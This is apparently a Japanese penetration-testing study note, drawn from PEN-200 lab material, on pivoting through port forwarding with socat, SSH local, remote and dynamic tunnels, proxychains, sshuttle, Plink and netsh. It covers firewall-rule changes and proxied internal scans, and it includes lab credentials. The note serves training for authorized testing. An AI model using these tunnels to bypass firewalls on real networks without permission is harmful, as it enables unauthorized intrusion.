- 関連ノート：
	- [Tunneling Through Deep Packet Inspection](Tunneling%20Through%20Deep%20Packet%20Inspection.md)

---
---

# Port Redirectionの基礎

Port Redirection ＝ Port Forwarding

## Port Redirectionの必要性

- ネットワークは分割（セグメント化）され、サブネット間はFWなどで通信経路が制御されている  
    → 攻撃者は「直接つながらないサービス」 にアクセスする必要が出る
- **想定シナリオ**
    - 内部のサーバーに外部から直接アクセスできない
    - FWが特定ポートをブロックしている
    - 踏み台サーバ（jump host）経由でしか内部リソースに触れないが、踏み台サーバには必要なツール（DBクライアント等）がインストールされていないし、インストールするための権限もない ...etc.

- そこで利用するのが **Port Redirection / Tunneling**  
    → ネットワークの制限を「迂回」して、目的のサービスへ到達できるようにする

---

## Port Forwardingの基本原理

リモートポートフォワーディング：
	リッスンポートで受信したパケットをリモート端末のポートに転送すること
![](../../../画像ファイル/Pasted%20image%2020250920144229.png)
$$リモートポートフォワーディングの概要イメージ(PEN-200)$$

ローカルポートフォワーディング：
	リッスンポートで受信したパケットをローカル端末のポートに転送すること
![](../../../画像ファイル/Pasted%20image%2020230526105054.png)
$$ローカルポートフォワーディングの概要イメージ(TryHackMe)$$

---
---

# LinuxツールによるPort Forwading(Socat)

- ⚠️Socatがインストールされていない場合は、[socat - 3ndG4me](https://github.com/3ndG4me/socat/releases)からスタンドアロンバイナリを攻撃者のマシンにダウンロードし、ターゲットに転送する
- このような単純なポートフォワーディングは検知・遮断されやすい

1. 足場上でリモートポートフォワーディング
```zsh
# 下図例：socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
socat -ddd TCP-LISTEN:[リッスンポート],fork TCP:[DestIP]:[Port]
```
- `-ddd`：詳細出力
- `fork`：指定することで、１回きりの通信で接続断しないようになる
- 💡踏み台のリッスンポートは1,024超えのwell-knownポート以外を指定する
![](../../../画像ファイル/Pasted%20image%2020250920195209.png)
$$Socatポートフォワーディング成功時出力$$
![](../../../画像ファイル/Pasted%20image%2020250920194904.png)
$$socatでのポートフォワーディングイメージ図(PEN-200)$$

2. 攻撃者のマシン(KALI-MACHINE)からリッスンポートにアクセスすることで、フォワーディング先のDestIPにアクセス可能

⚠️他のポートに対してポートフォワーディングをするためには、Ctrl + Zでターミナルを閉じ、再度ターミナルに接続後、既存のsocatプロセスを`kill`する

---
---

# SSH Port Forwardingの基礎

- 仕組み：SSHセッションで通信を==カプセル化（暗号化）==してPort Redirection

- **必要条件**：
	- FWにSSH通信が許可されている
	- インタラクティブなシェルが使える
		- WinRM接続中など、インタラクティブなシェルが使えない場合は、
			- (a) Unix系：`python3 -c 'import pty; pty.spawn("/bin/sh")'`
			- (b) Windows：[Port Redirection & SSH Port Forwarding](#Plink)や[Port Redirection & SSH Port Forwarding](#Netsh)を使う

- ✅通常のネットワークトラフィックと見分けがつきにくい
- ❌近年のFWに実装されているDeep Packet Inspection(DPI)機能により、悪意ある通信は検知され遮断されてしまう
	→HTTP通信が許可されている場合は[Tunneling Through Deep Packet Inspection](Tunneling%20Through%20Deep%20Packet%20Inspection.md)を使えば、DPIは回避可能

## SSHポートフォワーディングの種類と概要

単純な[Port Redirection & SSH Port Forwarding](#ポートフォワーディング)では、パケットをリッスンするホスト自身(CONFLUENCE01)がパケットを転送するが、SSHポートフォワーディングでは、リッスンする役割を担う機器と転送する役割を担う機器の２つの機器でポートフォワーディングをする

### SSHローカルポートフォワーディング

- 概要：ローカルマシン(SSHクライアント)のポートを、SSH サーバー経由で別のサーバーのポートに転送する
![](../../../画像ファイル/Pasted%20image%2020250920135759.png)
$$SSHローカルポートフォワーディングのイメージ図(PEN-200)$$

### SSHローカルダイナミックポートフォワーディング

- 概要：ローカルマシン(SSHクライアント)のポートを、SSH サーバー経由で別のサーバーの任意ポートに転送する
![](../../../画像ファイル/Pasted%20image%2020250923152247.png)
$$SSHローカルダイナミックポートフォワーディングのイメージ図(PEN-200)$$

### SSHリモートポートフォワーディング

- 概要：SSH サーバー側のポートを、ローカルマシン(SSHクライアント)経由で別のサーバーのポートに転送する
- 混乱ポイント：流れ
	1. SSHクライアントを足場のマシンとし、SSHサーバーを攻撃者のマシンとし、SSH接続開始
	2. 攻撃者のマシンのポートに送信されたパケットが、ステップ１で確立したSSH接続を介してSSHクライアントに送付され、そこから目的のマシンに到達

- 用途として、踏み台を介して社内NWにアクセスすることや、FWをバイパスして特定のポートにアクセスすることがある
![](../../../画像ファイル/Pasted%20image%2020250920135820.png)
$$SSHリモートポートフォワーディングのイメージ図(PEN-200)$$
![](../../../画像ファイル/Pasted%20image%2020250924122130.png)
$$SSHリモートポートフォワーディングのイメージ図(PEN-200)$$

### SSHリモートダイナミックポートフォワーディング

- 概要：SSHサーバー側のポートを、ローカルマシン(SSHクライアント)経由で別のサーバーの任意ポートに転送する
![](../../../画像ファイル/Pasted%20image%2020250923120928.png)
$$SSHリモートダイナミックポートフォワーディングのイメージ図(PEN-200)$$

---
---

# SSH Local Port Forwarding

- 留意事項：
	- FWのルールは、アウトバウンドトラフィックには比較的寛容に設定されているが、インバウンドトラフィックには厳しいことが多い
	- Local Port Forwardingはインバウンドトラフィックが許可されていないと使えないので失敗することが多い(SSHクライアントで任意のリッスンポートを開いても、攻撃者のマシンからのリッスンポートへの通信がFWで遮断される)
	- →[Port Redirection & SSH Port Forwarding](#SSH%20Remote%20Port%20Forwarding)のほうが成功確率高い

1. SSHクライアント上でSSH接続に必要なTTY機能が使えるようにする
```zsh
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

2. SSHクライアント上でローカルポートフォワーディング
	- 出力はなし
```zsh
# 例：ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
ssh -N -L 0.0.0.0:[SSH client LISTEN Port(1025以上任意)]:[DestIP]:[DestPort] [SSH server username]@[SSH server IP]
```
- Dest：下図の最終到達先である「HRSHARES」マシンのこと
- DestIPは、足場からネットワーク情報を列挙して発見する
	- [🔍Windows Local Enumeration](../../🪟Windows/🔍Windows%20Local%20Enumeration.md#ネットワーク情報収集コマンド)
	- [🔍Linux Enumeration](../../🐧Linux/🔍Linux%20Enumeration.md#ネットワーク情報収集コマンド)
- `-N`：ポートフォワーディングのために使用することを明示し、新たなシェルが開かないようにする
![](../../../画像ファイル/Pasted%20image%2020250923145526.png)
$$SSHローカルポートフォワーディングイメージ図$$

3. 別のセッションでSSHクライアントにアクセスし、SSHローカルポートフォワーディングに成功しているかどうかを確認
```zsh
# ss -tulpn
netstat -ano
```
	↓
```zsh
Netid  State   Recv-Q  Send-Q         Local Address:Port     Peer Address:Port  Process                                                                         
tcp    LISTEN  0       128                  0.0.0.0:4455          0.0.0.0:*      users:(("ssh",pid=59288,fd=4))
…
```

4. 攻撃者のマシンからSSHクライアントのリッスンポートに接続することで、目的マシンのDestPortにアクセス可能

---

# SSH Local Dynamic Port Forwarding

- [Port Redirection & SSH Port Forwarding](#SSH%20Local%20Port%20Forwarding)と同じく、現実では失敗する可能性が高い
	- →[Port Redirection & SSH Port Forwarding](#SSH%20Remote%20Dynamic%20Port%20Forwarding)

1. SSHクライアント上でSSH接続に必要なTTY機能が使えるようにする
	- RDP接続など、インタラクティブなシェルにアクセスできているなら不要
```zsh
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

2. SSHクライアント上でローカルダイナミックポートフォワーディング
	- 出力はなし
```zsh
# 例：ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
ssh -N -D 0.0.0.0:[SSH client LISTEN Port(1025以上任意)] [SSH server username]@[SSH server IP]
```

3. 攻撃者のマシン上で、Proxychainsの設定を変更する
	- ⚠️Proxychainsは関数をフックする仕組みを使うので、静的リンクされたバイナリには使えない
```zsh
sudo nano /etc/proxychains4.conf
```
	↓
```zsh
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 [SSH client IP] [SSH client LISTEN Port(1025以上任意)]
```
- ProxyListはstrict_chainモード(デフォルト)では１つにしておく必要がある

4. 攻撃者のマシンから、コマンドの先頭に`proxychains`をつけて実行することで、任意のポートにフォワーディングできる（SSHクライアントのIP/ポートは指定不要）
```zsh
# 例：Nmapの場合（sTでないとProxyChains経由で動作しない）
sudo proxychains nmap -vvv -sT --top-ports=20 -Pn [DestIP]
# 例：smbclientの場合
sudo proxychains smbclient -L //[DestIP]/ -U hr_admin --password=Welcome1234
```
- DestIPは、足場からネットワーク情報を列挙して発見する
	- [🔍Windows Local Enumeration](../../🪟Windows/🔍Windows%20Local%20Enumeration.md#ネットワーク情報収集コマンド)
	- [🔍Linux Enumeration](../../🐧Linux/🔍Linux%20Enumeration.md#ネットワーク情報収集コマンド)

💡`proxychains nmap`の速度が遅い場合は、Proxychainsの設定で以下の２つの値を小さくする
```zsh
# Some timeouts in milliseconds
tcp_read_time_out 15000
tcp_connect_time_out 8000
```
	↓
```zsh
tcp_read_time_out 1200
tcp_connect_time_out 800
```

---

# SSH Remote Port Forwarding

1. 攻撃者のマシンでSSHサーバーをスタートする
```zsh
sudo systemctl start ssh
```

2. SSHクライアント上でSSH接続に必要なTTY機能が使えるようにする
	- RDP接続など、インタラクティブなシェルにアクセスできているなら不要
```zsh
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

3. SSHクライアント上でリモートポートフォワーディング
	- 出力はなし
```zsh
ssh -N -R 127.0.0.1:[SSH server LISTEN Port(1025以上任意)]:[DestIP]:[DestPort] [SSH server username(攻撃者)]@[SSH server IP]
```
- DestIPは、足場からネットワーク情報を列挙して発見する
	- [🔍Windows Local Enumeration](../../🪟Windows/🔍Windows%20Local%20Enumeration.md#ネットワーク情報収集コマンド)
	- [🔍Linux Enumeration](../../🐧Linux/🔍Linux%20Enumeration.md#ネットワーク情報収集コマンド)

4. 攻撃者のマシンでリモートポートフォワーディングが成功しているかどうかを確認
```zsh
ss -tulpn
```
	↓
```zsh
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
tcp   LISTEN 0      128        127.0.0.1:[listenport]      0.0.0.0:*
```

![](../../../画像ファイル/Pasted%20image%2020250923181415.png)
$$SSHリモートポートフォワーディングイメージ図(PEN-200)$$

5. 攻撃者のマシンから攻撃者マシンのリッスンポートに接続することで、目的マシンのDestPortにアクセス可能
```zsh
# 例：postgresql
psql -h 127.0.0.1 -p 2345 -U postgres

# 例：ssh
ssh database_admin@127.0.0.1 -p 2222
```

---

# SSH Remote Dynamic Port Forwarding

SSH Port Forwardingの中では**最強**で、これを優先的に使う

1. 攻撃者のマシンでSSHサーバーをスタートする
```zsh
sudo systemctl start ssh
```

2. SSHクライアント上でSSH接続に必要なTTY機能が使えるようにする
	- RDP接続など、インタラクティブなシェルにアクセスできているなら不要
```zsh
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

3. SSHクライアント上でリモートダイナミックポートフォワーディング
	- 出力はなし
```zsh
ssh -N -R [SSH server LISTEN Port(1025以上任意)] [SSH server username(攻撃者)]@[SSH server IP]
```
- SSH serverのIPアドレスを渡す必要はなく、ポートだけ渡せば、デフォルトでSSHサーバーのループバックインターフェースにバインドされる

4. 攻撃者のマシンでリモートポートフォワーディングが成功しているかどうかを確認
```zsh
ss -tulpn
```
	↓9998をSSH server LISTEN Portとした場合の出力
```zsh
Netid State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process
tcp   LISTEN  0       128          127.0.0.1:9998        0.0.0.0:*     users:(("sshd",pid=939038,fd=9))
tcp   LISTEN  0       128            0.0.0.0:22          0.0.0.0:*     users:(("sshd",pid=181432,fd=3))
tcp   LISTEN  0       128              [::1]:9998           [::]:*     users:(("sshd",pid=939038,fd=7))
```

![](../../../画像ファイル/Pasted%20image%2020250923184203.png)
$$リモートダイナミックポートフォワーディングによって内部NWを列挙する図(PEN-200)$$

5. 攻撃者のマシン上で、Proxychainsの設定を変更する
	- ⚠️Proxychainsは関数をフックする仕組みを使うので、静的リンクされたバイナリには使えない
```zsh
sudo nano /etc/proxychains4.conf
```
	↓
```zsh
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 [SSH server LISTEN Port(1025以上任意)]
```
- ProxyListはstrict_chainモード(デフォルト)では１つにしておく必要がある

6. 攻撃者のマシンから、コマンドの先頭に`proxychains`をつけて実行することで、任意のポートにフォワーディングできる
```zsh
# 例：Nmapの場合
sudo proxychains nmap -vvv -sT --top-ports=20 -Pn -n [DestIP]
```
- 🚨スキャン時は、DestIPに対し、足場からネットワーク情報を列挙して発見した内部NW側のインターフェースを使用する

💡`proxychains nmap`の速度が遅い場合は、Proxychainsの設定で以下の２つの値を小さくする
```zsh
# Some timeouts in milliseconds
tcp_read_time_out 15000
tcp_connect_time_out 8000
```
	↓
```zsh
tcp_read_time_out 4000
tcp_connect_time_out 2000
```

---

# sshuttle(Dynamic Port Forwardingの簡素化)

- sshuttleとは
	- SSH をトンネルとして利用し、特定のサブネットへのトラフィックをすべてそのトンネルに流す仕組みを持つ
	- ユーザーにとっては「VPN に接続したかのように内部ネットワークに入れる」ように見える
	- VPNよりも軽量な、簡易VPNツールのようなもの

- 条件：
	- SSHクライアントにroot権限：iptables操作やパケットのキャプチャのため
	- SSHサーバーにPython3：リモートでコードを実行するためのtty


1. 足場上でリモートポートフォワーディング
```zsh
socat -ddd TCP-LISTEN:[リッスンポート],fork TCP:[DestIP]:[DestPort]
```

2. 攻撃者のマシン上でsshuttleを使用し、トンネルをしたい**サブネット**を指定
```zsh
# 例：sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
sshuttle -r [足場のsshユーザー名]@[足場のIP]:[リッスンポート] [サブネット]
```

3. 指定したサブネット内のIPに対し任意の操作
```zsh
# smbclientの場合
smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

---
---

# WindowsツールによるPort Forwaring

## ssh.exe

条件：windowsマシンにOpenSSHクライアント(ssh.exe)がインストールされているときに使用可能

1. 攻撃者のマシンでsshをスタート
```zsh
sudo systemctl start ssh
```

2. SSHクライアントであるwindowsマシンにssh.exeがあることを確認する
	- リモートダイナミックポートフォワーディングが可能なバージョン は7.7以上
```powershell
# cmdの場合：where ssh → ssh.exe -V
Get-Command ssh
```
	↓
```powershell
CommandType     Name    Version    Source
-----------     ----    -------    ------
Application     ssh.exe 8.1.0.1    C:\Windows\System32\OpenSSH\ssh.exe
```

3. あとは[Port Redirection & SSH Port Forwarding](#SSH%20Remote%20Dynamic%20Port%20Forwarding)のステップ３以降と同じ(`ssh -N...`)

![](../../../画像ファイル/Pasted%20image%2020250924072013.png)
$$ssh.exeを使ったリモートダイナミックポートフォワーディングのイメージ図(PEN-200)$$

---

## Plink

- ssh.exeが使えない場合や、インタラクティブなシェルが使えないとき(WinRM接続中など）に使用を検討
- 条件：足場のマシンへのCLIアクセスが可能なとき使用可能
	- ❌リモートダイナミックポートフォワーディングは使えない
- PlinkはPuTTYのCLI版

> ⚠️ Kaliのパスワードが記録されてしまう恐れあり
> 信頼できないNWに対してのペネトレにおいては、ポートフォワーディング用ユーザーを作成すべき

1. 攻撃者のマシンでsshをスタート
```zsh
sudo systemctl start ssh
```

2. 攻撃者のマシンからPlinkを足場のマシンに転送
	- [ファイル操作、ユーティリティ](../../Common/ファイル操作、ユーティリティ.md#Apache%20webサーバー)
```zsh
# plinkのパス
/usr/share/windows-resources/binaries/plink.exe
```

3. 足場のマシン上でリモートポートフォワーディング
	- このコマンドで表示されるシェルには何も入力しない
```powershell
# windowsシェルが非ttyシェルの場合は先頭に`cmd.exe /c echo y |`を追加
C:\Windows\Temp\plink.exe -ssh -l [攻撃者のusername] -pw [pw] -R 127.0.0.1:[SSH server LISTEN Port(1025以上任意)]:127.0.0.1:[Plinkクライアントリッスンポート] [AttackerIP]
```
![](../../../画像ファイル/Pasted%20image%2020250924122130.png)
$$PlinkポートフォワーディングでFWをバイパスしているイメージ図(PEN-200)$$

4. 任意の操作を実施
```zsh
# proxychainsは不要
# mysql接続例
mysql -h 127.0.0.1 -P <SSH server LISTEN Port(1025以上任意)> -u <username> -p
```

---

## Netsh

- NetshはWindows OS標準の機能で、SSHクライアントに使えるツールが何もないときなど、特に制限が厳しいときに使用する
- 条件：
	- 足場のマシンへのCLIアクセスが可能なとき
	- **管理者権限**があるとき


1. 管理者権限でcmd.exeを開き、netshのportproxyルールを追加しポートフォワーディング
	- 出力はなし
```cmd
netsh interface portproxy add v4tov4 listenport=[Netshクライアントリッスンポート(1025以上任意)] listenaddress=[NetshクライアントIP] connectport=[Dest Port] connectaddress=[Dest IP]
```
- `v4tov4`：IPv4からIPv4へのポートフォワーディングを意味する
![](../../../画像ファイル/Pasted%20image%2020250925065912.png)
$$netshによるポートフォワーディングのイメージ(PEN-200)$$

2. 攻撃者のマシンから足場のマシンへの通信がFWで遮断される場合は、netshでFWを操作し、リッスンポートへの通信を許可する
	- 成功時はOk.と出力
```cmd
netsh advfirewall firewall add rule name="[rule name]" protocol=TCP dir=in localip=[NetshクライアントIP] localport=[指定したリッスンポート] action=allow
```
![](../../../画像ファイル/Pasted%20image%2020250925071526.png)
$$netshでFWの穴あけ後$$
3. 攻撃者のマシンからNmap等でリッスンポート経由でDestのソケットにアクセス
```zsh
# 例
sudo nmap -sS [NetshクライアントIP] -Pn -n -p [指定したリッスンポート]
```

4. netshによる変更の取り消し
```powershell
# FWルールの削除
netsh advfirewall firewall delete rule name="[rulename]"
# ポートフォワーディングの削除
netsh interface portproxy del v4tov4 listenport=[指定したリッスンポート] listenaddress=[NetshクライアントIP]
```

---

# トラブルシューティング

| 問題                                                                   | 原因                                                 | 対策                                         |
| -------------------------------------------------------------------- | -------------------------------------------------- | ------------------------------------------ |
| `TLS/SSL error: SSL is required, but the server does not support it` | SSL/TLS接続を要求しているが、SSH tunnel経由ではSSLが不要（既に暗号化されている） | SSL接続を無効化するオプションを付与する（mysqlの場合：--skip-ssl） |
| ポートフォワーディングをctrl+Cしてもまだ接続されている                                       | sshサービスを停止しても、既存のセッションは切断されない                      | `sudo pkill sshd`                          |
|                                                                      |                                                    |                                            |